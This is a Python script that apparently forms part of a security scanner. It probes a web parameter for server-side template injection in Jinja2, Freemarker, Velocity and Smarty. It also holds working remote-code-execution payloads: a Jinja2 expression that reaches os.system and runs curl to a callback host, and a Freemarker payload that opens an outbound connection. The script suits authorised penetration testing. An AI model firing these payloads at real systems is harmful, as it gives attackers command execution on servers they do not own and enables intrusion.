#!/usr/bin/env python3
"""Template Injection Tester

Tests for Server-Side Template Injection (SSTI):
- Jinja2
- Freemarker
- Velocity
- Smarty
"""

import requests
from typing import Dict, Any, Optional


def test_ssti(target_url: str, param: str = "q", callback_url: Optional[str] = None) -> Dict[str, Any]:
    """Test for SSTI vulnerabilities
    
    Args:
        target_url: Target URL
        param: Parameter to test
        callback_url: Optional callback URL for RCE validation
        
    Returns:
        Dict with test results
    """
    result = {
        "test": "ssti",
        "vulnerable": False,
        "template_engine": None,
        "evidence": None
    }
    
    # Template engine detection payloads
    payloads = {
        "jinja2": "{{7*7}}",
        "freemarker": "${7*7}",
        "velocity": "#set($x=7*7)$x",
        "smarty": "{7*7}",
    }
    
    for engine, payload in payloads.items():
        try:
            resp = requests.get(
                target_url,
                params={param: payload},
                timeout=10
            )
            
            # Check if expression evaluated
            if "49" in resp.text:
                result["vulnerable"] = True
                result["template_engine"] = engine
                result["evidence"] = {
                    "payload": payload,
                    "response_snippet": resp.text[:500]
                }
                break
        except Exception:
            continue
    
    # If vulnerable, test RCE
    if result["vulnerable"] and callback_url:
        rce_payloads = {
            "jinja2": f"{{{{config.__class__.__init__.__globals__['os'].system('curl {callback_url}')}}}}",
            "freemarker": f"${{new java.net.URL('{callback_url}').openConnection()}}",
        }
        
        engine = result["template_engine"]
        if engine in rce_payloads:
            try:
                resp = requests.get(
                    target_url,
                    params={param: rce_payloads[engine]},
                    timeout=10
                )
                # Check callback for RCE confirmation
                result["rce_tested"] = True
            except Exception:
                pass
    
    return result

